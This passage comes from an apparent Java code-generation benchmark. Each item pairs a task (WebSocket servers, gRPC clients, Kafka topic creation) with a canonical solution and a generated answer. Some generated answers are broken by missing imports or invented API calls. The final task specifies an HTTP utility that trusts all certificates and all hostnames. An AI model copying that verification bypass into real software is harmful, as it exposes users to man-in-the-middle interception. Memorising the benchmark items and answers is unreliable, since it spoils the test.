    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\nimport lombok.extern.slf4j.Slf4j;\n\n@ServerEndpoint(value = \"/container/deploy/{id}\", configurator = CustomConfigurator.class)\n@Component\n@Slf4j\npublic class ContainerDeployServerEndpoint {\n\n    @Autowired\n    private ContainerService containerService;\n\n    @OnOpen\n    public void onOpen(@PathParam(\"id\") Long id, Session session) {\n        try {\n            session.getBasicRemote().sendText(\"Connection confirmed for container \" + id);\n            containerService.deployContainer(id);\n            session.close();\n        } catch (Exception e) {\n            log.error(\"Failed to deploy container \" + id, e);\n            try {\n                session.close();\n            } catch (IOException ex) {\n                log.error(\"Failed to close session\", ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        try {\n            session.close();\n        } catch (IOException e) {\n            log.error(\"Failed to close session\", e);\n        }\n        log.error(\"WebSocket error occurred\", throwable);\n    }\n}\n```"
  },
  {
    "Task_id": 493,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java to handle real-time communication between clients, manage client connections, and broadcast messages to all connected clients.\n\nClass Description: MyWebSocket is a Java class that serves as a WebSocket server endpoint. It maintains a list of connected clients, handles connection events, processes incoming messages, and broadcasts messages to all connected clients while also logging messages to a database.\n\nAttributes:\n- onlineCount: [static int] - Tracks the number of currently connected clients\n- webSocketSet: [static CopyOnWriteArraySet<MyWebSocket>] - Thread-safe set containing all active WebSocket sessions\n- session: [Session] - Represents the WebSocket session for a connected client\n- contentService: [ContentService] - Service for persisting messages to a database (autowired via Spring)\n\nMethods:\n- onOpen: [onOpen]([Session session]) -> [void] - Handles new client connections, adds session to the set, and increments online count\n- onClose: [onClose]() -> [void] - Handles client disconnections, removes session from the set, and decrements online count\n- onMessage: [onMessage]([String message, Session session]) -> [void] - Processes incoming messages and broadcasts them to all connected clients\n- onError: [onError]([Session session, Throwable error]) -> [void] - Handles any errors that occur during WebSocket communication\n- sendMessage: [sendMessage]([String message]) -> [void] - Sends a message to the client and persists it to the database\n- getOnlineCount: [getOnlineCount]() -> [int] - Returns the current number of connected clients (synchronized)\n- addOnlineCount: [addOnlineCount]() -> [void] - Increments the online client count (synchronized)\n- subOnlineCount: [subOnlineCount]() -> [void] - Decrements the online client count (synchronized)",
    "Canonical_solution": "import com.crossoverJie.pojo.Content;\nimport com.crossoverJie.service.ContentService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.socket.server.standard.SpringConfigurator;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(value = \"/websocket\",configurator = SpringConfigurator.class)\npublic class MyWebSocket {\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<MyWebSocket>();\n    private Session session;\n\n    @Autowired\n    private ContentService contentService;\n\n    @OnOpen\n    public void onOpen(Session session){\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n        System.out.println(\"\u6709\u65b0\u8fde\u63a5\u52a0\u5165\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnClose\n    public void onClose(){\n        webSocketSet.remove(this);\n        subOnlineCount();\n        System.out.println(\"\u6709\u4e00\u8fde\u63a5\u5173\u95ed\uff01\u5f53\u524d\u5728\u7ebf\u4eba\u6570\u4e3a\" + getOnlineCount());\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        System.out.println(\"\u6765\u81ea\u5ba2\u6237\u7aef\u7684\u6d88\u606f:\" + message);\n        for(MyWebSocket item: webSocketSet){\n            try {\n                item.sendMessage(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n                continue;\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error){\n        System.out.println(\"\u53d1\u751f\u9519\u8bef\");\n        error.printStackTrace();\n    }\n\n    public void sendMessage(String message) throws IOException{\n        Content content = new Content() ;\n        content.setContent(message);\n        SimpleDateFormat sm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:dd\") ;\n        content.setCreatedate(sm.format(new Date()));\n        contentService.insertSelective(content) ;\n        this.session.getBasicRemote().sendText(message);\n    }\n\n    public static synchronized int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public static synchronized void addOnlineCount() {\n        MyWebSocket.onlineCount++;\n    }\n\n    public static synchronized void subOnlineCount() {\n        MyWebSocket.onlineCount--;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@ServerEndpoint(\"/websocket\")\npublic class MyWebSocket {\n    private static int onlineCount = 0;\n    private static CopyOnWriteArraySet<MyWebSocket> webSocketSet = new CopyOnWriteArraySet<>();\n    private Session session;\n    @Autowired\n    private ContentService contentService;\n\n    @OnOpen\n    public void onOpen(Session session) {\n        this.session = session;\n        webSocketSet.add(this);\n        addOnlineCount();\n        System.out.println(\"New client connected, total: \" + getOnlineCount());\n    }\n\n    @OnClose\n    public void onClose() {\n        webSocketSet.remove(this);\n        subOnlineCount();\n        System.out.println(\"Client disconnected, total: \" + getOnlineCount());\n    }\n\n    @OnMessage\n    public void onMessage(String message, Session session) {\n        System.out.println(\"Received message: \" + message);\n        broadcast(message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        System.err.println(\"Error occurred: \" + error.getMessage());\n    }\n\n    public void sendMessage(String message) throws IOException {\n        if (session != null && session.isOpen()) {\n            session.getBasicRemote().sendText(message);\n            contentService.persistMessage(message);\n        }\n    }\n\n    public synchronized static int getOnlineCount() {\n        return onlineCount;\n    }\n\n    public synchronized static void addOnlineCount() {\n        onlineCount++;\n    }\n\n    public synchronized static void subOnlineCount() {\n        onlineCount--;\n    }\n\n    private void broadcast(String message) {\n        for (MyWebSocket webSocket : webSocketSet) {\n            try {\n                webSocket.sendMessage(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 494,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for a chat application that broadcasts received messages to all connected clients.\n\nClass Description: The ChatEndpoint class represents a WebSocket server endpoint that handles real-time chat communication. It listens for incoming messages and broadcasts them to all currently connected clients.\n\nAttributes: None\n\nMethods:\n- message: [Name](String message, Session client) -> void - Handles incoming WebSocket messages. Receives a message string and the client session that sent it, then broadcasts the message to all connected sessions.\n  - Input Parameters:\n    - message: String - The chat message received from a client\n    - client: Session - The WebSocket session of the client that sent the message\n  - Output: None (messages are sent directly to client sessions)\n  - Throws: IOException, EncodeException - If there are issues sending messages to clients",
    "Canonical_solution": "import java.io.IOException;\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        System.out.println(\"message: \" + message);\n        for (Session peer : client.getOpenSessions()) {\n            peer.getBasicRemote().sendText(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.Collections;\nimport java.util.HashSet;\nimport java.util.Set;\n\n@ServerEndpoint(\"/chat\")\npublic class ChatEndpoint {\n    private static Set<Session> sessions = Collections.synchronizedSet(new HashSet<>());\n\n    @OnOpen\n    public void onOpen(Session client) {\n        sessions.add(client);\n    }\n\n    @OnMessage\n    public void message(String message, Session client) throws IOException, EncodeException {\n        synchronized (sessions) {\n            for (Session session : sessions) {\n                if (!session.equals(client)) {\n                    session.getBasicRemote().sendText(message);\n                }\n            }\n        }\n    }\n\n    @OnClose\n    public void onClose(Session client) {\n        sessions.remove(client);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        System.err.println(\"Error occurred: \" + throwable.getMessage());\n    }\n}\n```"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that echoes received text messages back to the client asynchronously.\n\nClass Description: This class represents a WebSocket server endpoint that handles text-based communication with clients. It listens for incoming text messages and echoes them back to the sender using asynchronous communication.\n\nAttributes: None\n\nMethods:\n- echoText: [String text, Session session] -> void - Handles incoming text messages from clients. Takes the received text and the client session as input, then sends the same text back to the client asynchronously using the session's async remote endpoint.",
    "Canonical_solution": "import javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/text\")\npublic class MyAsyncEndpointText {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.OnMessage;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(\"/echo\")\npublic class EchoWebSocket {\n\n    @OnMessage\n    public void echoText(String text, Session session) {\n        session.getAsyncRemote().sendText(text);\n    }\n}\n```"
  },
  {
    "Task_id": 496,
    "Instruction": "Task Description: Create a gRPC client class in Java that checks the health of a gRPC server using the gRPC Health Checking Protocol.\n\nClass Description: The GrpcHealthClient class establishes a connection to a gRPC server and provides functionality to check the server's health status. It manages the gRPC channel and stub for communication with the server.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [HealthStub] - The asynchronous gRPC stub for health check operations\n\nMethods:\n- GrpcHealthClient(String host, int port) -> [void] - Constructor that initializes the gRPC channel and stub with the specified server host and port\n- checkHealth() -> [HealthCheckResponse] - Sends a health check request to the server and returns the response\n- shutdown() -> [void] - Shuts down the gRPC channel gracefully",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.health.v1.HealthCheckRequest;\nimport io.grpc.health.v1.HealthCheckResponse;\nimport io.grpc.health.v1.HealthGrpc;\nimport io.grpc.health.v1.HealthGrpc.HealthStub;\n\npublic class GrpcHealthClient {\n\n    private final ManagedChannel channel;\n    private final HealthStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = HealthGrpc.newStub(channel);\n    }\n\n    public HealthCheckResponse checkHealth() {\n        HealthCheckRequest request = HealthCheckRequest.getDefaultInstance();\n        AwaitableStreamObserver<HealthCheckResponse> responseObserver = new AwaitableStreamObserver<>();\n        stub.check(request, responseObserver);\n        return responseObserver.getSingle();\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.health.v1.Health;\nimport io.grpc.health.v1.HealthCheckRequest;\nimport io.grpc.health.v1.HealthCheckResponse;\nimport io.grpc.health.v1.HealthGrpc;\n\npublic class GrpcHealthClient {\n    private ManagedChannel channel;\n    private HealthGrpc.HealthBlockingStub stub;\n\n    public GrpcHealthClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = HealthGrpc.newBlockingStub(channel);\n    }\n\n    public HealthCheckResponse checkHealth() throws StatusRuntimeException {\n        return stub.check(HealthCheckRequest.newBuilder().setService(\"\").build());\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n}\n```"
  },
  {
    "Task_id": 497,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a database service, allowing for retrieval of blockchain data and dynamic properties.\n\nClass Description: The DatabaseGrpcClient class provides a gRPC client implementation for connecting to a database service. It establishes a connection to a gRPC server, provides methods to retrieve blockchain blocks and dynamic properties, and handles connection shutdown.\n\nAttributes:\n- channel: [ManagedChannel] - The communication channel between the client and the gRPC server\n- databaseBlockingStub: [DatabaseGrpc.DatabaseBlockingStub] - The blocking stub used to make synchronous RPC calls to the server\n\nMethods:\n- Constructor: [DatabaseGrpcClient](String host, int port) -> [void] - Creates a new client instance connecting to the specified host and port\n- Constructor: [DatabaseGrpcClient](String host) -> [void] - Creates a new client instance connecting to the specified host (using default port)\n- getBlock: [getBlock](long blockNum) -> [Block] - Retrieves a block from the blockchain; if blockNum is negative, returns the latest block\n- shutdown: [shutdown]() -> [void] - Shuts down the connection channel\n- getDynamicProperties: [getDynamicProperties]() -> [DynamicProperties] - Retrieves the dynamic properties of the blockchain",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.DatabaseGrpc;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.DynamicProperties;\n\npublic class DatabaseGrpcClient {\n\n  private final ManagedChannel channel;\n  private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n  public DatabaseGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public DatabaseGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return databaseBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return databaseBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public void shutdown() {\n    channel.shutdown();\n  }\n\n  public DynamicProperties getDynamicProperties() {\n    return databaseBlockingStub.getDynamicProperties(EmptyMessage.newBuilder().build());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport com.example.database.DatabaseGrpc;\nimport com.example.database.Block;\nimport com.example.database.DynamicProperties;\n\npublic class DatabaseGrpcClient {\n    private final ManagedChannel channel;\n    private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n    public DatabaseGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n    }\n\n    public DatabaseGrpcClient(String host) {\n        this(host, 50051); // Default port\n    }\n\n    public Block getBlock(long blockNum) {\n        if (blockNum < 0) {\n            return databaseBlockingStub.getLatestBlock(Empty.getDefaultInstance());\n        } else {\n            return databaseBlockingStub.getBlock(BlockRequest.newBuilder().setBlockNumber(blockNum).build());\n        }\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n\n    public DynamicProperties getDynamicProperties() {\n        return databaseBlockingStub.getDynamicProperties(Empty.getDefaultInstance());\n    }\n}\n```"
  },
  {
    "Task_id": 498,
    "Instruction": "Task Description: Create a gRPC client class for service discovery that handles connection management, stub creation, and remote method invocation with retry logic.\n\nClass Description: DiscoveryClient is a gRPC client implementation that manages connections to a discovery service, provides thread-safe operations, and includes automatic retry mechanisms for failed requests.\n\nAttributes:\n- requireResetStub: AtomicBoolean - Flag indicating whether the stub needs to be reset\n- channel: ManagedChannel - The gRPC communication channel\n- registerStub: DiscoveryServiceBlockingStub - Blocking stub for registration operations  \n- blockingStub: DiscoveryServiceBlockingStub - Blocking stub for general operations\n- readWriteLock: ReentrantReadWriteLock - Lock for thread-safe operations\n- pdAddresses: List<String> - Server addresses (implied from usage)\n\nMethods:\n- DiscoveryClient(String centerAddress) -> None - Constructor that initializes the client with target server address\n- getNodeInfos(Query query) -> NodeInfos - Retrieves node information from discovery service with retry logic\n- tryWithTimes(Function<V,R> function, V v) -> R - Helper method implementing retry logic for operations\n- resetStub() -> None - Resets the channel and stubs when connection issues occur  \n- resetChannel(String address) -> None - Recreates the channel and stubs with a new address\n- close() -> None - Shuts down the channel and cleans up resources\n\nThe class demonstrates proper gRPC client patterns including:\n1. Channel lifecycle management\n2. Thread-safe stub operations\n3. Connection retry mechanisms\n4. Resource cleanup\n5. Error handling for network operations",
    "Canonical_solution": "import org.apache.hugegraph.pd.grpc.discovery.DiscoveryServiceGrpc;\nimport org.apache.hugegraph.pd.grpc.discovery.NodeInfos;\nimport org.apache.hugegraph.pd.grpc.discovery.Query;\nimport org.apache.hugegraph.pd.grpc.discovery.RegisterInfo;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\nimport java.util.function.Function;\n\npublic class DiscoveryClient {\n\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel = null;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceGrpc.DiscoveryServiceBlockingStub blockingStub;\n    private ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n\n    public DiscoveryClient(String centerAddress) {\n        resetChannel(centerAddress);\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes((q) -> {\n            this.readWriteLock.readLock().lock();\n            NodeInfos nodes;\n            try {\n                nodes = this.blockingStub.getNodes(q);\n            } finally {\n                this.readWriteLock.readLock().unlock();\n            }\n            return nodes;\n        }, query);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        R r;\n        Exception ex = null;\n        for (int i = 0; i < 3; i++) {\n            try {\n                r = function.apply(v);\n                return r;\n            } catch (Exception e) {\n                requireResetStub.set(true);\n                resetStub();\n                ex = e;\n            }\n        }\n        if (ex != null) {\n            throw new RuntimeException(\"Discovery method failed\", ex);\n        }\n        return null;\n    }\n\n    private void resetStub() {\n        if (requireResetStub.get()) {\n            try {\n                resetChannel(pdAddresses.get(0));\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to reset stub\", e);\n            }\n        }\n    }\n\n    private void resetChannel(String address) {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.get()) {\n                if (channel != null) {\n                    channel.shutdownNow();\n                    channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n                }\n                channel = ManagedChannelBuilder.forTarget(address)\n                        .usePlaintext().build();\n                this.registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                this.blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n                requireResetStub.set(false);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to reset channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    public void close() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (channel != null) {\n                channel.shutdownNow();\n                channel.awaitTermination(100, TimeUnit.MILLISECONDS);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to close channel\", e);\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.stub.StreamObserver;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.ReentrantReadWriteLock;\n\npublic class DiscoveryClient {\n    private final AtomicBoolean requireResetStub = new AtomicBoolean(false);\n    private ManagedChannel channel;\n    private DiscoveryServiceBlockingStub registerStub;\n    private DiscoveryServiceBlockingStub blockingStub;\n    private final ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n    private final List<String> pdAddresses;\n\n    public DiscoveryClient(String centerAddress) {\n        this.pdAddresses = List.of(centerAddress);\n        initializeChannelAndStubs();\n    }\n\n    public NodeInfos getNodeInfos(Query query) {\n        return tryWithTimes(() -> blockingStub.getNodeInfos(query), null);\n    }\n\n    private <V, R> R tryWithTimes(Function<V, R> function, V v) {\n        int retries = 0;\n        while (true) {\n            try {\n                return function.apply(v);\n            } catch (Exception e) {\n                if (++retries >= 3) throw e;\n                resetStub();\n            }\n        }\n    }\n\n    private void resetStub() {\n        readWriteLock.writeLock().lock();\n        try {\n            if (requireResetStub.compareAndSet(true, false)) {\n                resetChannel(pdAddresses.get(0));\n            }\n        } finally {\n            readWriteLock.writeLock().unlock();\n        }\n    }\n\n    private void resetChannel(String address) {\n        channel.shutdownNow();\n        channel = ManagedChannelBuilder.forAddress(address, 50051)\n                .usePlaintext()\n                .build();\n        registerStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n        blockingStub = DiscoveryServiceGrpc.newBlockingStub(channel);\n    }\n\n    public void close() {\n        channel.shutdownNow();\n    }\n}\n```"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to a gRPC server for executing GraphQL queries and handling responses asynchronously.\n\nClass Description: The GraphQlGrpcClient class establishes a connection to a gRPC server, provides functionality to execute GraphQL queries, and handles server responses asynchronously. It manages the gRPC channel lifecycle and provides cleanup methods.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [GraphQlServiceGrpc.GraphQlServiceStub] - The asynchronous gRPC stub for making service calls\n- ON_COMPLETE: [CountDownLatch] - Synchronization aid to wait for response completion\n- logger: [Logger] - Logger instance for logging client activities\n\nMethods:\n- GraphQlGrpcClient(String host, int port) -> [Constructor] - Creates a client instance with specified host and port, using plaintext connection\n- GraphQlGrpcClient(ManagedChannel channel) -> [Constructor] - Creates a client instance with an existing channel\n- shutdown() -> [void] - Shuts down the channel gracefully with a 5-second timeout\n- query(String query) -> [void] - Executes a GraphQL query asynchronously and logs responses/errors",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.examples.graphql.GraphQlRequest;\nimport io.grpc.examples.graphql.GraphQlResponse;\nimport io.grpc.examples.graphql.GraphQlServiceGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n  private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n  private final ManagedChannel channel;\n  private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n  private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n\n  public GraphQlGrpcClient(String host, int port) {\n    this(ManagedChannelBuilder.forAddress(host, port).usePlaintext().build());\n  }\n\n  GraphQlGrpcClient(ManagedChannel channel) {\n    this.channel = channel;\n    stub = GraphQlServiceGrpc.newStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public void query(String query) {\n    GraphQlRequest request =\n        GraphQlRequest.newBuilder().build().newBuilder().setQuery(query).build();\n\n    stub.execute(\n        request,\n        new StreamObserver<GraphQlResponse>() {\n          @Override\n          public void onNext(GraphQlResponse value) {\n            logger.info(\"onNext: \" + value);\n          }\n\n          @Override\n          public void onError(Throwable t) {\n            logger.log(Level.WARNING, t, () -> \"onError\");\n            ON_COMPLETE.countDown();\n          }\n\n          @Override\n          public void onCompleted() {\n            logger.info(\"onCompleted\");\n            ON_COMPLETE.countDown();\n          }\n        });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n    private final ManagedChannel channel;\n    private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n    private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n    private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n    public GraphQlGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public GraphQlGrpcClient(ManagedChannel channel) {\n        this.channel = channel;\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public void shutdown() {\n        try {\n            channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void query(String query) {\n        stub.query(\n                QueryRequest.newBuilder().setQuery(query).build(),\n                new StreamObserver<Response>() {\n                    @Override\n                    public void onNext(Response value) {\n                        logger.info(\"Received response: \" + value.getResult());\n                    }\n\n                    @Override\n                    public void onError(Throwable t) {\n                        logger.severe(\"Query error: \" + t.getMessage());\n                    }\n\n                    @Override\n                    public void onCompleted() {\n                        ON_COMPLETE.countDown();\n                    }\n                }\n        );\n        try {\n            ON_COMPLETE.await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new topic in a Kafka cluster using the AdminClient API. It establishes a connection to the Kafka broker, defines the topic configuration (name, partition count, and replication factor), and creates the topic. The function ensures proper resource cleanup by closing the AdminClient after topic creation.\n\nInput:\n- brokerAddress: String - The address of the Kafka broker to connect to (e.g., \"localhost:9092\")\n- topicName: String - The name of the topic to be created\n- partitionCount: int - The number of partitions for the topic\n- replicationFactor: short - The replication factor for the topic\n\nOutput: void - The function does not return any value but creates the specified topic in the Kafka cluster. Any exceptions during topic creation will be thrown to the caller.\n\nNote: The function handles resource cleanup by closing the AdminClient in a finally block to prevent resource leaks.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Map;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\n\npublic void testDiskFailure() throws IOException {\n    AdminClient adminClient = KafkaCruiseControlUtils.createAdminClient(Collections\n        .singletonMap(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, broker(0).plaintextAddr()));\n    try {\n        adminClient.createTopics(Collections.singleton(new NewTopic(TOPIC0, PARTITION_COUNT, TOPIC0_REPLICATION_FACTOR)));\n    } finally {\n        KafkaCruiseControlUtils.closeAdminClientWithTimeout(adminClient);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class KafkaTopicCreator {\n    public static void createTopic(String brokerAddress, String topicName, int partitionCount, short replicationFactor) throws Exception {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, brokerAddress);\n        AdminClient adminClient = AdminClient.create(props);\n\n        NewTopic newTopic = new NewTopic(topicName, partitionCount, replicationFactor);\n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n\n        try {\n            result.all().get(); // Wait for topic creation to complete\n        } catch (InterruptedException | ExecutionException e) {\n            throw new RuntimeException(\"Failed to create topic\", e);\n        } finally {\n            adminClient.close(); // Ensure AdminClient is closed properly\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 50,
    "Instruction": "Task Description: Create a Java utility class for making HTTP/HTTPS requests with support for custom timeouts, request methods, content types, and handling of both successful and error responses.\n\nClass Description: HttpUtil is a utility class that provides methods for making HTTP/HTTPS requests. It handles both secure (HTTPS) and non-secure (HTTP) connections, supports various request methods (GET, POST, etc.), and includes proper error handling and resource cleanup.\n\nAttributes:\n- Timeout: [int] - Default timeout value for connections (5000ms)\n- DefalutEncoding: [String] - Default character encoding for requests/responses (\"UTF-8\")\n- currentProxy: [Map] - Storage for proxy configuration (currently unused in the reference implementation)\n- allHostsValid: [HostnameVerifier] - Custom hostname verifier that accepts all HTTPS hosts\n\nMethods:\n- httpRequest: [httpRequest(String requestUrl, int timeOut, String requestMethod, String contentType, String postString, String encoding)] -> [String] - Makes an HTTP/HTTPS request with specified parameters and returns the response as a string\n- readString: [readString(InputStream inputStream, String encoding)] -> [String] - Helper method to read an InputStream into a String with specified encoding\n- X509TrustUtiil: [Nested class implementing X509TrustManager] - Custom trust manager that accepts all certificates for HTTPS connections\n\nThe class handles:\n1. Both HTTP and HTTPS connections\n2. Custom timeouts for connect and read operations\n3. Various request methods (GET, POST, etc.)\n4. Request headers (particularly Content-Type)\n5. Request body for POST requests\n6. Proper error stream handling\n7. Resource cleanup (connection closing, stream closing)\n8. SSL certificate verification bypass for HTTPS\n9. Character encoding for requests and responses",
